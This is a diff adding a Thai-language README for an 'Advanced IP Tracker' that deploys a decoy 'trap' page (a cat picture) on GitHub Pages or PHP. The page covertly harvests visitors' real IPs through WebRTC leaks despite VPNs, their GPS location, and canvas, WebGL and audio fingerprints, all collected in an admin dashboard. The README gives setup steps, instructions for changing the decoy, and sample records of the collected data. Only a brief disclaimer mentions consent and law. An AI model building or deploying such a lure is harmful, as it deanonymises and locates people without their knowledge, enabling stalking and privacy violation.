@@ -1,2 +1,203 @@
-# IP-Tracker
+# 🔍 Advanced IP Tracker with Fingerprinting
 
+ระบบติดตาม IP และ Fingerprint ขั้นสูงที่รวม FingerprintJS v4, WebGL, Audio fingerprint และการตรวจจับพิกัดสำหรับความแม่นยำ 99.99%
+
+## ✨ คุณสมบัติ
+
+### 🌐 การติดตาม IP
+- **Public IP จริง** - แม้ใช้ VPN ก็ตรวจจับได้
+- **Local IP** - แสดง IP ภายในเครือข่าย (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
+- **WebRTC Leak Detection** - ใช้เทคนิค WebRTC เพื่อดึง IP จริง
+
+### 📱 ข้อมูลอุปกรณ์
+- **User-Agent เต็มรูปแบบ** - รุ่นมือถือ, OS, Browser
+- **Hardware Information** - CPU cores, RAM, Touch support
+- **Screen & Display** - ความละเอียดหน้าจอ, Pixel ratio, Color depth
+- **Platform & Language** - แพลตฟอร์ม, ภาษา, Timezone
+
+### 📍 พิกัดและตำแหน่ง
+- **GPS Coordinates** - Latitude/Longitude ด้วยความแม่นยำสูง
+- **Geolocation API** - ใช้ HTML5 Geolocation
+- **GeoIP Lookup** - แสดงประเทศ, เมือง, ISP จาก IP
+
+### 🔍 Fingerprinting ขั้นสูง
+- **FingerprintJS v4** - Device fingerprinting แบบโปรเฟสชั่นแนล
+- **Canvas Fingerprinting** - ตรวจจับการ render ของ Canvas
+- **WebGL Fingerprinting** - ข้อมูล GPU และ WebGL renderer
+- **Audio Fingerprinting** - ตรวจจับลักษณะเสียงของอุปกรณ์
+- **Plugin Detection** - รายชื่อ plugins ที่ติดตั้ง
+- **Battery Information** - สถานะแบตเตอรี่ (ถ้ามี)
+
+### 📊 แดชบอร์ด Admin
+- **Real-time Monitoring** - อัพเดทข้อมูลแบบเรียลไทม์
+- **Visitor Analytics** - สถิติผู้เข้าชม
+- **Data Export** - ส่งออกข้อมูลดิบ
+- **Historical Tracking** - ติดตามประวัติการเข้าชม
+
+## 🚀 การติดตั้งและใช้งาน
+
+### สำหรับ GitHub Pages (แนะนำ)
+```bash
+# 1. สร้าง repository ใหม่บน GitHub
+# 2. Clone repository ลงเครื่อง
+git clone https://github.com/yourusername/your-repo.git
+cd your-repo
+
+# 3. คัดลอกไฟล์ทั้งหมดไปยัง repository
+cp -r /path/to/ip-tracker/* .
+
+# 4. แก้ไข GitHub Token ใน index.html (ถ้าต้องการใช้ GitHub Gists)
+# แทนที่ YOUR_GITHUB_TOKEN ด้วย token จริงจาก https://github.com/settings/tokens
+
+# 5. Commit และ push
+git add .
+git commit -m "Add IP tracker with fingerprinting"
+git push origin main
+
+# 6. เปิด GitHub Pages ใน repository settings
+# Settings > Pages > Source: Deploy from a branch > Branch: main
+```
+
+### สำหรับ Server แบบดั้งเดิม (PHP)
+```bash
+# ให้แน่ใจว่า PHP 7.4+ และ Apache/Nginx พร้อมใช้งาน
+# ให้สิทธิ์เขียนโฟลเดอร์สำหรับเก็บข้อมูล
+chmod 755 /path/to/your/project
+```
+
+### เข้าถึงระบบ
+- **หน้า Trap**: `https://yourusername.github.io/your-repo/index.html`
+- **Admin Panel**: `https://yourusername.github.io/your-repo/admin.html`
+
+### การตั้งค่า GitHub Token (Optional)
+1. ไปที่ https://github.com/settings/tokens
+2. สร้าง Personal Access Token ใหม่ (เลือก scope: gist)
+3. แทนที่ `YOUR_GITHUB_TOKEN` ใน `index.html` ด้วย token จริง
+4. ข้อมูลจะถูกบันทึกเป็น GitHub Gists แทน localStorage
+
+## 📁 โครงสร้างไฟล์
+
+```
+IP-Tracker/
+├── index.html          # หน้าแสดงรูปแมว + JavaScript tracking
+├── admin.php           # แดชบอร์ด admin
+├── src/
+│   └── save.php        # API สำหรับบันทึกข้อมูล
+├── data/               # โฟลเดอร์ข้อมูล (สร้างอัตโนมัติ)
+│   └── {visitor_id}/
+│       ├── visits.json
+│       ├── fingerprints.json
+│       └── geo_{ip}.json
+├── leaks.txt           # Log สรุป
+├── .gitignore          # Git ignore rules
+└── README.md           # ไฟล์นี้
+```
+
+## 🔧 การปรับแต่ง
+
+### เปลี่ยนหน้า Trap
+แก้ไข `index.html` เพื่อเปลี่ยนเนื้อหาหลอก:
+```html
+<h1>เปลี่ยนข้อความตรงนี้</h1>
+<img src="เปลี่ยนรูปภาพตรงนี้" alt="คำอธิบาย">
+```
+
+### ปรับแต่ง Fingerprinting
+แก้ไขฟังก์ชันใน `index.html`:
+```javascript
+// เพิ่ม fingerprinting เพิ่มเติม
+function customFingerprint() {
+    // รหัสของคุณ
+}
+```
+
+### ปรับแต่ง Admin Panel
+แก้ไข `admin.php` เพื่อเพิ่มฟีเจอร์:
+```php
+// เพิ่มฟังก์ชัน admin ใหม่
+function customAdminFeature() {
+    // รหัสของคุณ
+}
+```
+
+## 📊 ข้อมูลที่เก็บ
+
+### ไฟล์ visits.json
+```json
+{
+  "timestamp": "2024-01-01 12:00:00",
+  "visitor_id": "abc123...",
+  "fingerprint_confidence": 0.95,
+  "user_agent": "Mozilla/5.0...",
+  "platform": "Win32",
+  "local_ips": ["192.168.1.100"],
+  "public_ips": ["203.0.113.1"],
+  "location": {
+    "latitude": 13.7563,
+    "longitude": 100.5018,
+    "accuracy": 50
+  }
+}
+```
+
+### ไฟล์ fingerprints.json
+```json
+{
+  "timestamp": "2024-01-01 12:00:00",
+  "fingerprintjs_components": [...],
+  "canvas_fingerprint": "data:image/png;base64,...",
+  "webgl_fingerprint": {
+    "renderer": "GeForce GTX 1060",
+    "vendor": "NVIDIA Corporation"
+  },
+  "audio_fingerprint": "1a2b3c..."
+}
+```
+
+## ⚠️ คำเตือนทางกฎหมาย
+
+**โปรดใช้อย่างรับผิดชอบและถูกกฎหมายเท่านั้น**
+- ตรวจสอบกฎหมาย PDPA/GDPR ในประเทศของคุณ
+- ควรแจ้งผู้ใช้ก่อนเก็บข้อมูลส่วนบุคคล
+- ใช้เพื่อการศึกษาและพัฒนาเท่านั้น
+
+## 🔒 ความปลอดภัย
+
+- ข้อมูลถูกเก็บในโฟลเดอร์ `data/` แยกตาม visitor_id
+- ใช้ JSON format ที่มนุษย์อ่านได้
+- ไม่มีการเข้ารหัสข้อมูล (เพิ่มได้ตามต้องการ)
+- แนะนำให้ใช้ HTTPS เสมอ
+
+## 🆘 การแก้ปัญหา
+
+### ข้อมูลไม่แสดงใน Admin
+1. ตรวจสอบสิทธิ์โฟลเดอร์ `data/`
+2. ตรวจสอบ PHP error logs
+3. ตรวจสอบ CORS headers
+
+### Fingerprinting ไม่ทำงาน
+1. ตรวจสอบ Console errors ใน browser
+2. ตรวจสอบ Content Security Policy
+3. ทดสอบบน HTTPS
+
+### IP ไม่ถูกต้อง
+1. WebRTC อาจถูกบล็อกโดย VPN
+2. ลองใช้ STUN servers อื่น
+3. ตรวจสอบ firewall settings
+
+## 🤝 การมีส่วนร่วม
+
+พบปัญหาหรือมีไอเดียปรับปรุง?
+- สร้าง Issue ใน repository
+- Fork และส่ง Pull Request
+- แชร์ feedback ในการใช้งาน
+
+## 📄 License
+
+MIT License - ใช้ได้ฟรี แต่ต้องระบุเครดิต
+
+---
+
+**พัฒนาโดย**: IP-Tracker Team
+**เวอร์ชัน**: 2.0 (Enhanced Fingerprinting)
+**อัพเดทล่าสุด**: 2024
